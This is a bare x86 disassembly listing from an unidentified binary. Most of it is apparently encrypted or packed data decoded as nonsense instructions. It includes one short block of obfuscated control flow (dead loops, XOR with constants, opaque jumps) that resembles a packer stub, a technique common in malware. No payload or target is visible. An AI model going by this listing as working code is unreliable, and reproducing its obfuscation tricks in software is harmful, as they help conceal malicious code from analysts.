  418791:	sub    esi,DWORD PTR gs:[esi]
  418794:	pop    ebx
  418795:	jecxz  0x4187d2
  418797:	sub    ebx,esi
  418799:	push   esp
  41879a:	leave  
  41879b:	dec    esi
  41879c:	pop    ebp
  41879d:	mov    bl,0xcf
  41879f:	jns    0x4187fc
  4187a1:	(bad)  
  4187a3:	sar    ebp,cl
  4187a5:	jmp    0xf671:0xafaaee33
  4187ac:	int3   
  4187ad:	push   ss
  4187ae:	stos   BYTE PTR es:[edi],al
  4187af:	stos   BYTE PTR es:[edi],al
  4187b0:	or     DWORD PTR [ebx-0x7335fdb3],edi
  4187b6:	mov    eax,0x265555ab
  4187bb:	out    dx,eax
  4187bc:	(bad)  
  4187bd:	mov    BYTE PTR [eax-0xe],dh
  4187c0:	out    dx,eax
  4187c1:	nop
  4187c2:	adc    eax,0x4aff9b9f
  4187c7:	test   al,0x2
  4187c9:	shl    BYTE PTR gs:[edi+ecx*4+0x1cdb41b7],0x68
  4187d2:	les    eax,FWORD PTR [eax+0x58]
  4187d5:	leave  
  4187d6:	dec    edi
  4187d7:	(bad)  
  4187d8:	mov    ah,0x6f
  4187da:	fidiv  WORD PTR [esi+eiz*4]
  4187dd:	jno    0x4187a3
  4187df:	or     ch,0x98
  4187e2:	add    al,0x23
  4187e4:	add    edi,DWORD PTR ds:0x5e9bd1e7
  4187ea:	jg     0x418841
  4187ec:	(bad)  
  4187ed:	mov    dh,0x5a
  4187ef:	xchg   edx,eax
  4187f0:	push   ss
  4187f1:	(bad)  
  4187f2:	mov    ch,0xc4
  4187f4:	arpl   bx,dx
  4187f6:	rcl    DWORD PTR [edi],cl
  4187f8:	pushf  
  4187f9:	ja     0x41878a
  4187fb:	xor    al,0xf8
  4187fd:	loop   0x41885a
  4187ff:	call   0x5f74:0x82210ca8
  418806:	stos   BYTE PTR es:[edi],al
  418807:	xor    DWORD PTR [edx+0x60ad2181],0xd1d9d64a
  418811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418812:	rol    DWORD PTR [esi+0x31542ecf],1
  418818:	jo     0x4187c4
  41881a:	dec    edi
  41881b:	mov    bh,0x47
  41881d:	ror    BYTE PTR [esi+esi*2],1
  418820:	xchg   DWORD PTR [ebx+0x8],ebx
  418823:	mov    BYTE PTR [eax+0x35],ch
  418826:	mov    edi,0x98faffb5
  41882b:	xor    al,0x56
  41882d:	push   ds
  41882e:	adc    DWORD PTR [edi+0x68],ecx
  418831:	sub    bh,BYTE PTR [esi-0xd]
  418834:	xor    BYTE PTR [eax],ah
  418836:	(bad)  
  418837:	xabort 0xb6
  41883a:	stos   BYTE PTR es:[edi],al
  41883b:	sbb    dh,BYTE PTR [ecx-0x70]
  41883e:	or     esp,DWORD PTR [esi]
  418840:	dec    esp
  418841:	test   BYTE PTR [eax+0x26113777],ch
  418847:	in     al,dx
  418848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418849:	or     cl,0xe3
  41884c:	xor    BYTE PTR [bx+si],0x5e
  418850:	pop    ds
  418851:	push   eax
  418852:	das    
  418853:	arpl   bp,ax
  418855:	jbe    0x41886e
  418857:	(bad)  
  418858:	sahf   
  418859:	les    esi,FWORD PTR [esi+ecx*8+0x355786e5]
  418860:	add    edi,DWORD PTR [ecx+0x53]
  418863:	pop    ebx
  418864:	pushf  
  418865:	hlt    
  418866:	or     al,0x7e
  418868:	(bad)  
  418869:	xor    edx,ebp
  41886b:	xchg   BYTE PTR [esi+0x43],bh
  41886e:	test   BYTE PTR [ebp+eax*8-0x16],cl
  418872:	into   
  418873:	dec    esp
  418874:	int    0xc3
  418876:	adc    DWORD PTR [ebx],0xf3957384
  41887c:	xchg   edi,eax
  41887d:	ins    BYTE PTR es:[edi],dx
  41887e:	add    bl,ah
  418880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418881:	lahf   
  418882:	outs   dx,BYTE PTR ds:[esi]
  418883:	clc    
  418884:	stos   DWORD PTR es:[edi],eax
  418885:	outs   dx,BYTE PTR ds:[esi]
  418886:	jle    0x4188d9
  418888:	xor    edi,DWORD PTR [edi]
  41888a:	inc    ecx
  41888b:	out    dx,eax
  41888c:	mov    ebx,0x282dde41
  418891:	mov    ebx,0x9588ee57
  418896:	jnp    0x41885f
  418898:	push   esp
  418899:	or     DWORD PTR fs:[edi],ebp
  41889c:	dec    edx
  41889d:	ds ins BYTE PTR es:[edi],dx
  41889f:	out    0x5e,al
  4188a1:	fnstcw WORD PTR [edi+0x26bfadc1]
  4188a7:	mov    eax,ds:0xce1a625
  4188ac:	pop    es
  4188ad:	xlat   BYTE PTR ds:[ebx]
  4188ae:	sti    
  4188af:	pop    ds
  4188b0:	mov    ah,0x44
  4188b2:	test   ah,0x62
  4188b5:	inc    eax
  4188b6:	inc    ebp
  4188b7:	sub    DWORD PTR [esi+ecx*8-0x6f97e31e],eax
  4188be:	adc    DWORD PTR ds:0x9dcb62bc,edx
  4188c4:	outs   dx,DWORD PTR ds:[esi]
  4188c5:	push   ebp
  4188c6:	add    ecx,ebp
  4188c8:	jmp    0x9c5ae366
  4188cd:	dec    edi
  4188ce:	pop    edi
  4188cf:	dec    eax
  4188d0:	shr    DWORD PTR [bp+di-0x4d],cl
  4188d4:	xchg   ebx,eax
  4188d5:	data16 mov bh,0x76
  4188d8:	pop    ecx
  4188d9:	in     al,dx
  4188da:	or     bl,dh
  4188dc:	fcmovbe st,st(7)
  4188de:	and    DWORD PTR [esi],ebp
  4188e0:	mov    dl,0x89
  4188e2:	xor    ebp,DWORD PTR [edx]
  4188e4:	out    dx,al
  4188e5:	scas   eax,DWORD PTR es:[edi]
  4188e6:	xor    al,0x5a
  4188e8:	or     eax,0xffffffdb
  4188eb:	rcr    BYTE PTR [edx-0x37],1
  4188ee:	sub    dl,0x4f
  4188f1:	cs inc eax
  4188f3:	ficom  WORD PTR [ebx+0xb2ac38]
  4188f9:	inc    edi
  4188fa:	or     BYTE PTR [ebp-0x33],cl
  4188fd:	fs out 0x9f,eax
  418900:	pushf  
  418901:	push   ebx
  418902:	scas   al,BYTE PTR es:[edi]
  418903:	sti    
  418904:	cmp    BYTE PTR [esi],cl
  418906:	leave  
  418907:	or     dh,BYTE PTR [eax-0x2d]
  41890a:	fwait
  41890b:	dec    ebp
  41890c:	push   esp
  41890d:	fcom   st(7)
  41890f:	outs   dx,DWORD PTR ds:[esi]
  418910:	fisubr DWORD PTR [eax+0x3208a9a3]
  418916:	ins    BYTE PTR es:[edi],dx
  418917:	dec    eax
  418919:	mov    es,edx
  41891b:	js     0x418950
  41891d:	mov    ebp,0xb07dcbe8
  418922:	jae    0x418961
  418924:	push   cs
  418925:	leave  
  418926:	pop    ebx
  418927:	ss fsubr st,st(3)
  41892a:	out    0x7e,eax
  41892c:	pushf  
  41892d:	adc    eax,DWORD PTR [ebx]
  41892f:	mov    ch,0x85
  418931:	dec    ebx
  418932:	fwait
  418933:	(bad)  
  418934:	dec    esi
  418935:	mov    dh,0x97
  418937:	dec    edi
  418938:	pop    edi
  41893a:	nop
  41893b:	pop    esp
  41893c:	sub    dh,BYTE PTR gs:[ebx+eiz*8+0x3dfdb322]
  418944:	dec    ebx
  418945:	cmp    BYTE PTR [eax+0x2b],dh
  418948:	push   ebp
  418949:	data16 aaa 
  41894b:	iret   
  41894c:	enter  0x2de8,0xc9
  418950:	inc    esi
  418951:	xor    ebp,DWORD PTR [edi]
  418953:	inc    edx
  418954:	fmul   DWORD PTR [ebp-0x5ec2f84b]
  41895a:	push   ebp
  41895b:	xchg   edx,eax
  41895c:	lock shr bl,cl
  41895f:	jmp    DWORD PTR [edi+0x787c8ae9]
  418965:	cmp    eax,0x45a45ad6
  41896a:	int    0xd8
  41896c:	pop    es
  41896d:	xchg   esp,eax
  41896e:	nop
  41896f:	shr    DWORD PTR [edi+ebp*8+0x2c6ff813],cl
  418976:	cmp    bl,BYTE PTR ds:0xcd825087
  41897c:	pop    esi
  41897d:	test   BYTE PTR [edi+ebp*2],0x3b
  418981:	push   ss
  418982:	js     0x41892b
  418984:	not    BYTE PTR [esi]
  418986:	mov    edi,0xffe9ff31
  41898b:	and    edi,DWORD PTR [esi]
  41898d:	addr16 ss jp 0x418a04
  418991:	ret    0x4924
  418994:	push   es
  418995:	test   BYTE PTR [ecx-0x4233a0ce],cl
  41899b:	mov    al,0x8b
  41899d:	ins    BYTE PTR es:[edi],dx
  41899e:	sbb    eax,0x2eb3d8d0
  4189a3:	sbb    BYTE PTR [ebp-0x4fb8e682],dl
  4189a9:	or     eax,0xe304148a
  4189ae:	xchg   ecx,eax
  4189af:	adc    eax,0x4de9b5d9
  4189b4:	(bad)  
  4189b5:	pop    ss
  4189b6:	mov    dh,0x62
  4189b8:	dec    ebx
  4189b9:	mov    esp,esp
  4189bb:	scas   al,BYTE PTR es:[edi]
  4189bc:	test   eax,0xd62fbab3
  4189c1:	out    0x46,al
  4189c3:	aam    0x7a
  4189c5:	fwait
  4189c6:	xor    ecx,eax
  4189c8:	add    ecx,esi
  4189ca:	adc    DWORD PTR ds:0x42a2ee,edi
  4189d0:	mov    DWORD PTR [ebp-0xc],ecx
  4189d3:	add    DWORD PTR ds:0x42a25a,0x6cdc
  4189dd:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4189e4:	mov    DWORD PTR ds:0x42a2ca,0x1d36
  4189ee:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4189f5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4189fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4189ff:	mov    DWORD PTR ds:0x42a2ee,0x1b
  418a09:	cmp    DWORD PTR ds:0x42a2ee,0x0
  418a10:	je     0x418a4a
  418a16:	cmp    DWORD PTR ds:0x42a2ee,0x1c
  418a1d:	ja     0x418a4a
  418a23:	jmp    0x418a38
  418a28:	push   0x4b24
  418a2d:	push   0x42a296
  418a32:	call   DWORD PTR ds:0x42a3f2
  418a38:	mov    edi,DWORD PTR ds:0x42a2ee
  418a3e:	dec    edi
  418a3f:	mov    DWORD PTR ds:0x42a2ee,edi
  418a45:	jmp    0x418a09
  418a4a:	mov    DWORD PTR [ebp+0x8],ecx
  418a4d:	mov    edi,DWORD PTR ds:0x42a28e
  418a53:	xor    edi,DWORD PTR ds:0x42a2c6
  418a59:	mov    DWORD PTR ds:0x42a28e,edi
  418a5f:	mov    ecx,DWORD PTR [ebp+0x8]
  418a62:	xor    ecx,eax
  418a64:	mov    DWORD PTR ds:0x42a2b6,0x16
  418a6e:	cmp    DWORD PTR ds:0x42a2b6,0x0
  418a75:	je     0x418aac
  418a7b:	cmp    DWORD PTR ds:0x42a2b6,0x1d
  418a82:	ja     0x418aac
  418a88:	jmp    0x418a98
  418a8d:	push   0x42a28a
  418a92:	call   DWORD PTR ds:0x42a3f6
  418a98:	xor    edi,edi
  418a9a:	xor    edi,DWORD PTR ds:0x42a2b6
  418aa0:	dec    edi
  418aa1:	mov    DWORD PTR ds:0x42a2b6,edi
  418aa7:	jmp    0x418a6e
  418aac:	add    ecx,esi
  418aae:	mov    ecx,0x242ebc9
  418ab3:	mov    edi,0xf641bc8
  418ab8:	je     0x421e4f
  418abe:	and    DWORD PTR ds:0x42a27a,0x0
  418ac8:	jmp    0x418adc
  418acd:	xor    ebx,ebx
  418acf:	or     ebx,DWORD PTR ds:0x42a27a
  418ad5:	inc    ebx
  418ad6:	mov    DWORD PTR ds:0x42a27a,ebx
  418adc:	cmp    DWORD PTR ds:0x42a27a,0x14
  418ae3:	jae    0x418b2d
  418ae9:	cmp    DWORD PTR ds:0x42a27a,0xa
  418af0:	jb     0x418b2d
  418af6:	jmp    0x418b0e
  418afb:	push   DWORD PTR [ebp-0x14]
  418afe:	push   0x42a272
  418b03:	push   0x7a1d
  418b08:	call   DWORD PTR ds:0x42a3fa
  418b0e:	cmp    DWORD PTR ds:0x42a27a,0x9
  418b15:	jne    0x418b28
  418b1b:	mov    ebx,DWORD PTR ds:0x42a27a
  418b21:	inc    ebx
  418b22:	mov    DWORD PTR ds:0x42a27a,ebx
  418b28:	jmp    0x418acd
  418b2d:	mov    edx,DWORD PTR [ebp+0x8]
  418b30:	mov    ebx,DWORD PTR [ebp-0x8]
  418b33:	xor    edx,eax
  418b35:	xor    ebx,eax
  418b37:	sub    edx,ebx
  418b39:	sub    DWORD PTR ds:0x42a26e,edi
  418b3f:	sub    edx,esi
  418b41:	sub    ebx,0x5edd
  418b47:	xor    edx,eax
  418b49:	adc    ebx,DWORD PTR ds:0x42a272
  418b4f:	mov    DWORD PTR [ebp+0x8],edx
  418b52:	adc    DWORD PTR ds:0x42a2d6,edx
  418b58:	jmp    0x41aeb0
  418b5d:	add    al,ch
  418b5f:	test   BYTE PTR [edx-0x15ff7d6a],0x26
  418b66:	and    BYTE PTR [edx-0x3e],dl
  418b69:	cwde   
  418b6a:	inc    edx
  418b6b:	mov    al,0x7b
  418b6d:	(bad)  
  418b6e:	sbb    al,0x7c
  418b70:	add    DWORD PTR [esi+0x5e],0xffffff83
  418b74:	or     DWORD PTR [edx],0xffffff8e
  418b77:	rcr    DWORD PTR [eax-0x65],1
  418b7a:	outs   dx,BYTE PTR ds:[esi]
  418b7b:	lahf   
  418b7c:	pop    ebx
  418b7d:	repnz repnz xchg edx,eax
  418b80:	mov    dl,dl
  418b82:	jg     0x418bfd
  418b84:	mov    ebx,0xd8225704
  418b89:	scas   eax,DWORD PTR es:[edi]
  418b8a:	imul   esp,esp,0xffffffa3
  418b8d:	xchg   esp,eax
  418b8e:	and    ebx,esi
  418b90:	loopne 0x418b24
  418b92:	mov    cl,0xf6
  418b94:	and    eax,DWORD PTR [edi]
  418b96:	lods   al,BYTE PTR ds:[esi]
  418b97:	imul   ebp,DWORD PTR [ebx+0x543e4e4d],0x2b24c46b
  418ba1:	ror    DWORD PTR [ecx],1
  418ba3:	data16 (bad) 
  418ba5:	int    0xfd
  418ba7:	adc    al,0x28
  418ba9:	cs cmc 
  418bab:	jne    0x418bed
  418bad:	mov    dl,0xab
  418baf:	inc    esi
  418bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bb1:	clc    
  418bb2:	add    BYTE PTR [edi-0x41],dh
  418bb5:	adc    bh,bh
  418bb7:	dec    BYTE PTR [ebp+ecx*4+0xf]
  418bbb:	sub    BYTE PTR [esp+eiz*4+0x6725f78f],cl
  418bc2:	outs   dx,DWORD PTR ds:[esi]
  418bc3:	cmovg  edi,edx
  418bc6:	fiadd  WORD PTR [ebx]
  418bc8:	add    edx,DWORD PTR cs:[esi+0x17]
  418bcc:	mov    al,ds:0x9bc8ce4
  418bd1:	lahf   
  418bd2:	lods   eax,DWORD PTR ds:[esi]
  418bd3:	loope  0x418bc9
  418bd5:	pop    ebx
  418bd6:	pop    eax
  418bd7:	lea    ebx,[ecx-0x2c72b3d7]
  418bdd:	pop    ebp
  418bde:	(bad)
  418be2:	xchg   edi,eax
  418be3:	fucomi st,st(7)
  418be5:	stc    
  418be6:	jmp    0x418bfd
  418be8:	aaa    
  418be9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bea:	mov    bh,0x5
  418bec:	in     al,dx
  418bed:	iret   
  418bee:	sar    BYTE PTR [edx+0x33435f10],0x4a
  418bf5:	loop   0x418c1c
  418bf7:	or     eax,0xc57247b3
  418bfc:	aad    0x1a
  418bfe:	gs cmp eax,0x21ef4836
  418c04:	nop
  418c05:	mov    ds:0x202c77b3,eax
  418c0a:	jnp    0x418bf3
  418c0c:	test   dl,bl
  418c0e:	shr    dl,cl
  418c10:	in     eax,dx
  418c11:	jmp    0xb5d8322b
  418c16:	(bad)  
  418c17:	pop    ebp
  418c18:	add    bh,BYTE PTR [ebx+0x1533a95]
  418c1e:	sub    ebp,0x9c358150
  418c24:	aaa    
  418c25:	add    al,0x72
  418c27:	in     eax,dx
  418c28:	xlat   BYTE PTR ds:[ebx]
  418c29:	add    DWORD PTR [edi+0x19],0xcfcf47f1
  418c30:	cli    
  418c31:	pop    edx
  418c32:	push   cs
  418c33:	bound  edx,QWORD PTR [esi+ebp*2-0x55141541]
  418c3a:	push   esp
  418c3b:	add    eax,0x96e0a640
  418c40:	push   ss
  418c41:	cmp    dl,bl
  418c43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c44:	inc    esp
  418c45:	mov    eax,0x831f03f4
  418c4a:	int    0x5f
  418c4c:	jbe    0x418c53
  418c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c4f:	jbe    0x418c5b
  418c51:	xor    BYTE PTR [edi+0x59de0ae0],dl
  418c57:	sti    
  418c58:	xor    DWORD PTR [eax],esi
  418c5a:	dec    eax
  418c5b:	lods   eax,DWORD PTR ds:[esi]
  418c5c:	sahf   
  418c5d:	mov    edi,ebp
  418c5f:	xor    BYTE PTR [ebp+0x79237da2],bh
  418c65:	outs   dx,DWORD PTR ds:[esi]
  418c66:	push   es
  418c67:	xchg   ebx,eax
  418c68:	mov    ch,0xe9
  418c6a:	test   DWORD PTR [esi+ebx*8],ebp
  418c6d:	stc    
  418c6e:	stos   DWORD PTR es:[edi],eax
  418c6f:	dec    DWORD PTR [eax]
  418c71:	or     esi,esi
  418c73:	aas    
  418c74:	cbw    
  418c76:	(bad)  
  418c77:	mov    bl,0xd2
  418c79:	pop    eax
  418c7a:	sub    DWORD PTR [ebx+0x26c0f57e],esi
  418c80:	loop   0x418c54
  418c82:	leave  
  418c83:	push   0x86c68494
  418c88:	imul   edi,DWORD PTR [ebp+0x13],0x11b87ecd
  418c8f:	rep lods eax,DWORD PTR ds:[esi]
  418c91:	mov    DWORD PTR [ebp-0x3],ecx
  418c94:	xchg   esp,eax
  418c95:	and    bl,dl
  418c97:	xchg   ecx,eax
  418c98:	cdq    
  418c99:	das    
  418c9a:	or     ecx,DWORD PTR [esi]
  418c9c:	mov    edi,0x51f8cbb6
  418ca1:	mov    ch,0x66
  418ca3:	cdq    
  418ca4:	mov    edx,esp
  418ca6:	xrelease xchg DWORD PTR [esi-0x16604762],esp
  418cad:	in     al,0x11
  418caf:	dec    edi
  418cb0:	out    0xed,al
  418cb2:	aam    0xad
  418cb4:	mov    edx,0x1d3dc3e6
  418cb9:	out    dx,al
  418cba:	xchg   ebp,eax
  418cbb:	sub    bl,dh
  418cbd:	test   eax,0x848fc8b1
  418cc2:	je     0x418c66
  418cc4:	jp     0x418c75
  418cc6:	add    BYTE PTR [edi-0x25],al
  418cc9:	xor    al,ch
  418ccb:	test   BYTE PTR [eax-0x44],ah
  418cce:	or     al,0x26
  418cd0:	popa   
  418cd1:	out    0x1e,al
  418cd3:	repz out 0xbb,al
  418cd6:	sub    eax,0x275fa77
  418cdb:	xor    al,0xb1
  418cdd:	ret    0x9f8
  418ce0:	jl     0x418ca3
  418ce2:	js     0x418c7f
  418ce4:	jecxz  0x418cbc
  418ce6:	fistp  DWORD PTR [ecx]
  418ce8:	mov    BYTE PTR [ecx],ch
  418cea:	sar    bl,cl
  418cec:	mov    eax,ebp
  418cee:	lea    edi,[edx-0x56]
  418cf1:	iret   
  418cf2:	xor    eax,0x6152fb32
  418cf7:	icebp  
  418cf8:	jae    0x418ccc
  418cfa:	dec    esi
  418cfb:	dec    esi
  418cfc:	cmovp  esi,DWORD PTR [eax-0x79eb23dd]
  418d03:	add    al,0x68
  418d06:	icebp  
  418d07:	add    bh,ch
  418d09:	and    edi,esp
  418d0b:	xor    bh,BYTE PTR [esi]
  418d0d:	add    esp,DWORD PTR [ecx+0x47]
  418d10:	push   ecx
  418d11:	sbb    eax,0x7ff3289a
  418d16:	mov    al,ds:0xfdfdf0dc
  418d1b:	int3   
  418d1c:	inc    ecx
  418d1d:	call   0xcad:0x89fcf9cd
  418d24:	inc    edi
  418d25:	mov    al,ds:0xc85908ee
  418d2a:	retf   
  418d2b:	mov    bh,0x6c
  418d2d:	out    0x60,eax
  418d2f:	add    al,0xe1
  418d31:	and    DWORD PTR [esi-0x4f6276c4],0x7f
  418d38:	mov    ebp,0x1b5b7c82
  418d3d:	adc    DWORD PTR [edi],eax
  418d3f:	adc    BYTE PTR [edi],cl
  418d41:	aad    0x82
  418d43:	xor    ch,BYTE PTR [esi]
  418d45:	ss pop ebx
  418d47:	stos   DWORD PTR es:[edi],eax
  418d48:	das    
  418d49:	retf   0x4c66
  418d4c:	je     0x418d3c
  418d4e:	nop
  418d4f:	add    dh,bl
  418d51:	sub    eax,0x86f53bca
  418d56:	xchg   BYTE PTR [ecx+0x70],bh
  418d59:	data16 js 0x418cdc
  418d5c:	or     eax,0x10650269
  418d61:	sub    DWORD PTR [edx],0xffffffdb
  418d64:	jge    0x418d8e
  418d66:	sbb    eax,0x12893e2a
  418d6b:	test   eax,0x60cf4ff5
  418d70:	icebp  
  418d71:	adc    BYTE PTR [ecx-0x4b0425a8],dh
  418d77:	mov    dh,0x21
  418d79:	sub    DWORD PTR [edx-0x78],0x83b41aa9
  418d80:	out    dx,eax
  418d81:	sbb    bh,BYTE PTR [edi]
  418d83:	push   ebx
  418d84:	jl     0x418db0
  418d86:	xchg   edi,eax
  418d87:	stos   BYTE PTR es:[edi],al
  418d88:	int    0x7e
  418d8a:	mov    ecx,0x2c2091cb
  418d8f:	xchg   ebx,eax
  418d90:	add    eax,0xd777a61a
  418d95:	mov    esp,0x245b4b7a
  418d9a:	ds adc eax,0x56698a93
  418da0:	addr16 jg 0x418d86
  418da3:	inc    edi
  418da4:	outs   dx,BYTE PTR ds:[esi]
  418da5:	xchg   esp,eax
  418da6:	push   0x19
  418da8:	xchg   ecx,eax
  418da9:	add    BYTE PTR [esi],0xf9
  418dac:	fmul   DWORD PTR [eax]
  418dae:	pushf  
  418daf:	mov    ah,0x17
  418db1:	test   al,0x23
  418db3:	cmp    ch,BYTE PTR [ecx]
  418db5:	cli    
  418db6:	or     BYTE PTR [esi],ch
  418db8:	imul   edi,DWORD PTR [edx+0x73],0xa6cc9ca9
  418dbf:	and    esi,DWORD PTR [ebp+0x12063b0a]
  418dc5:	sub    al,cl
  418dc7:	loop   0x418e30
  418dc9:	mov    cl,0x94
  418dcb:	cdq    
  418dcc:	outs   dx,DWORD PTR ds:[esi]
  418dcd:	fs in  al,dx
  418dcf:	hlt    
  418dd0:	in     al,0x4f
  418dd2:	es in  al,0xd
  418dd5:	data16 cmc 
  418dd7:	ins    BYTE PTR es:[edi],dx
  418dd8:	por    mm2,QWORD PTR [esi+eax*4+0x56]
  418ddd:	inc    ebx
  418dde:	add    ecx,DWORD PTR [esi+0x6d79ed8c]
  418de4:	mov    ch,0xda
  418de6:	pop    edx
  418de7:	adc    DWORD PTR [eax-0x8],ebp
  418dea:	test   BYTE PTR [edx+0x431e884c],dh
  418df0:	xor    al,0x91
  418df2:	cli    
  418df3:	mov    es,WORD PTR [edx]
  418df5:	dec    edi
  418df6:	ret    0x7974
  418df9:	pop    ebx
  418dfa:	mov    dh,0x8e
  418dfc:	data16 mov ah,0x87
  418dff:	mov    edi,0x5f68247d
  418e04:	fild   WORD PTR [eax]
  418e06:	std    
  418e07:	adc    al,0xdf
  418e09:	jle    0x418e13
  418e0b:	add    esi,DWORD PTR [esi+ecx*4+0x5]
  418e0f:	add    al,BYTE PTR [edi+0x7e8547cd]
  418e15:	push   ecx
  418e16:	ror    edx,cl
  418e18:	push   esi
  418e19:	es or  ecx,0x24
  418e1d:	daa    
  418e1e:	addr16 cmc 
  418e20:	retf   0xd129
  418e23:	mov    dl,0x29
  418e25:	(bad)  
  418e26:	(bad)  
  418e28:	icebp  
  418e29:	mov    ds:0x2c0ddbe6,al
  418e2e:	dec    esp
  418e2f:	(bad)  
  418e30:	and    eax,0xcc67a789
  418e35:	gs cwde 
  418e37:	test   al,0xe7
  418e39:	es cli 
  418e3b:	clc    
  418e3c:	pop    esp
  418e3d:	pop    ss
  418e3e:	rcr    BYTE PTR [ebx],cl
  418e40:	in     al,0xc3
  418e42:	jl     0x418e8f
  418e44:	daa    
  418e45:	imul   esp,DWORD PTR ds:0x6c4990a5,0xffffffe3
  418e4c:	inc    edx
  418e4d:	scas   al,BYTE PTR es:[edi]
  418e4e:	int3   
  418e4f:	adc    al,0x80
  418e51:	pop    eax
  418e52:	hlt    
  418e53:	jo     0x418e7a
  418e55:	(bad)  
  418e56:	xchg   esp,eax
  418e57:	popa   
  418e58:	jl     0x418e33
  418e5a:	dec    ebx
  418e5b:	sub    ecx,DWORD PTR ds:0x3619517d
  418e61:	(bad)  
  418e63:	jb     0x418e4a
  418e65:	dec    ecx
  418e66:	push   es
  418e67:	ds (bad) 
  418e69:	and    eax,DWORD PTR [ebp-0x2a]
  418e6c:	inc    ebx
  418e6d:	mov    esi,0x39f0e7a6
  418e72:	fsubr  DWORD PTR [ebp+0x4b]
  418e75:	ret    0x3972
  418e78:	daa    
  418e79:	xchg   ebp,eax
  418e7a:	and    eax,0xa3613a01
  418e7f:	sbb    dh,BYTE PTR [eax-0x1c]
  418e82:	(bad)  
  418e83:	sbb    BYTE PTR [esi+edx*1+0x31],cl
  418e87:	sub    bl,0xb
  418e8a:	jnp    0x418e3b
  418e8c:	inc    eax
  418e8d:	enter  0xa58c,0xc5
  418e91:	shl    BYTE PTR [ebp+0x52],0x53
  418e95:	dec    edx
  418e96:	mov    bh,bh
  418e98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e99:	int    0x99
  418e9b:	sub    al,bl
  418e9d:	mov    cs,esi
  418e9f:	add    eax,0x5a860c37
  418ea4:	sahf   
  418ea5:	cmp    al,0xdb
  418ea7:	jg     0x418e4f
  418ea9:	jae    0x418eab
  418eab:	pop    edx
  418eac:	(bad)  
  418ead:	jge    0x418edd
  418eaf:	shr    BYTE PTR [esi-0x3464d81b],1
  418eb5:	add    al,0xd0
  418eb7:	add    eax,DWORD PTR [edi+0x75c6e1e5]
  418ebd:	xchg   esp,eax
  418ebe:	cmp    al,0x7d
  418ec0:	add    dl,BYTE PTR [edx+0x530ea66e]
  418ec6:	out    0xb5,eax
  418ec8:	ret    
  418ec9:	push   esi
  418eca:	aaa    
  418ecb:	mov    esp,DWORD PTR [edx-0x6d22fb02]
  418ed1:	pop    ebp
  418ed2:	ficomp DWORD PTR [ecx-0x6fa88adc]
  418ed8:	adc    BYTE PTR [ebx],0x7c
  418edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418edc:	(bad)  
  418edd:	xor    ebx,DWORD PTR [ebx-0x39]
  418ee0:	mov    ebx,0xd2ace799
  418ee5:	and    BYTE PTR [ebx-0x30768a6a],0x7e
  418eec:	imul   ecx,DWORD PTR [edi],0xcbcf3272
  418ef2:	cmp    al,0x76
  418ef4:	rol    esi,0x46
  418ef7:	js     0x418e9b
  418ef9:	mov    ds:0xd5ee5ad5,al
  418efe:	xlat   BYTE PTR ds:[ebx]
  418eff:	shr    BYTE PTR [ebx-0x3d656b8d],cl
  418f05:	fsub   DWORD PTR [edi-0x2a]
  418f08:	fidiv  WORD PTR [edi-0x5e]
  418f0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f0c:	pusha  
  418f0d:	cmc    
  418f0e:	inc    ecx
  418f0f:	xlat   BYTE PTR ds:[ebx]
  418f10:	cmc    
  418f11:	push   ebp
  418f12:	cmp    ebp,edx
  418f14:	add    BYTE PTR [edi],bh
  418f16:	icebp  
  418f17:	xchg   BYTE PTR [edx+0x2e8c7413],dl
  418f1d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  418f1f:	mov    ebp,0xe9ea5bf2
  418f24:	mov    cl,0xd3
  418f26:	pop    ss
  418f27:	call   0x3e0d:0xc50c5a6b
  418f2e:	pop    ebx
  418f2f:	inc    ebp
  418f30:	test   edx,esp
  418f32:	xchg   esi,eax
  418f33:	in     eax,dx
  418f34:	jno    0x418f81
  418f36:	loopne 0x418f43
  418f38:	fnstsw WORD PTR [ecx-0x72]
  418f3b:	je     0x418f5d
  418f3d:	in     al,dx
  418f3e:	cmp    DWORD PTR [ecx+0x1ac3a86f],ecx
  418f44:	pop    esi
  418f45:	sahf   
  418f46:	jmp    0xa13:0x68766a94
  418f4d:	data16 xlat BYTE PTR ds:[ebx]
  418f4f:	jno    0x418f65
  418f51:	rol    ah,cl
  418f53:	retf   
  418f54:	mov    ds:0x1079db90,al
  418f59:	xor    eax,0x9622adbb
  418f5e:	or     bl,cl
  418f60:	(bad)  
  418f61:	aaa    
  418f62:	inc    edx
  418f63:	lea    eax,[edx+0x6f]
  418f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f67:	jmp    0x6adc:0x68d9b830
  418f6e:	aad    0x58
  418f70:	xchg   ebp,eax
  418f71:	xchg   bl,ch
  418f73:	(bad)  
  418f74:	jb     0x418f02
  418f76:	call   0x5504:0x8c1985e1
  418f7d:	and    BYTE PTR ds:0xf1b95b63,dl
  418f83:	or     ah,BYTE PTR [edx]
  418f85:	lahf   
  418f86:	test   al,0xff
  418f88:	pop    ds
  418f89:	stc    
  418f8a:	sbb    eax,eax
  418f8c:	sub    BYTE PTR [edi],ah
  418f8e:	jbe    0x418f70
  418f90:	(bad)  
  418f91:	fistp  WORD PTR [eax+0x33]
  418f94:	pop    ss
  418f95:	pop    ecx
  418f96:	bnd je 0x419002
  418f99:	adc    eax,0xe417606
  418f9e:	popf   
  418f9f:	push   es
  418fa0:	mov    cl,0xf7
  418fa2:	in     al,dx
  418fa3:	dec    esi
  418fa4:	cmp    edi,DWORD PTR [edi-0x13b6e11f]
  418faa:	xchg   ebp,eax
  418fab:	out    0x1f,eax
  418fad:	out    dx,eax
  418fae:	cmp    esp,ebx
  418fb0:	pop    edx
  418fb1:	popf   
  418fb2:	nop
